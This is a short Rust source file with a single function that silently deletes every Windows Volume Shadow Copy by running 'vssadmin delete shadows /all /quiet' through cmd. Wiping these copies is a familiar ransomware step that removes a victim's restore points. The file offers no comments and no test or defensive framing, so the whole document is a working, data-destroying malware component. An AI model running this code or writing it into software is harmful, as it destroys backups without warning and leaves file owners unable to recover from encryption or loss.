use std::process::Command;

pub fn delete_shadow_copies() {

    let output = Command::new("cmd")
        .args(&["/C", &"vssadmin delete shadows /all /quiet"])
        .output()
        .expect("Failed to execute command");

    if output.status.success() {
        println!("Shadow copies deleted successfully");
    } else {
        println!("Failed to delete shadow copies");
    }
}